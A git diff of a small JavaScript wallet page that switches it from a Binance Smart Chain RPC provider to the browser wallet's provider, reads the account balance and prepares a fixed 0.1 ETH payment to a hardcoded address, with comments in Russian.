@@ -1,4 +1,4 @@
-document.addEventListener('DOMContentLoaded', () => {
+document.addEventListener('DOMContentLoaded', async () => {
   let account;
 
   document.getElementById('connect-button').addEventListener('click', async () => {
@@ -8,12 +8,12 @@ document.addEventListener('DOMContentLoaded', () => {
         account = (await ethereum.request({ method: 'eth_accounts' }))[0];
         console.log(`Connected to account: ${account}`);
 
-        const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+        const provider = new ethers.providers.Web3Provider(window.ethereum);
 
-        const balance = await bscProvider.getBalance(account);
-        const balanceInBNB = ethers.utils.formatEther(balance);
+        const balance = await provider.getBalance(account);
+        const balanceInETH = ethers.utils.formatEther(balance);
 
-        console.log(`Balance: ${balanceInBNB} BNB`);
+        console.log(`Balance: ${balanceInETH} ETH`);
       } catch (error) {
         console.error('Error connecting:', error);
       }
@@ -28,12 +28,12 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
-    const bscProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
+    const provider = new ethers.providers.Web3Provider(window.ethereum);
+    const signer = provider.getSigner();
 
-    const signer = bscProvider.getSigner();
     const transactionParam = {
       to: '0xE8E4058D0D5b4234a49fBF46Aa7371f04364373D', // Адрес получателя
-      value: ethers.utils.parseEther('0.1') // Отправляем 0.1 BNB (в wei)
+      value: ethers.utils.parseEther('0.1') // Отправляем 0.1 ETH (в wei)
     };
 
     try {
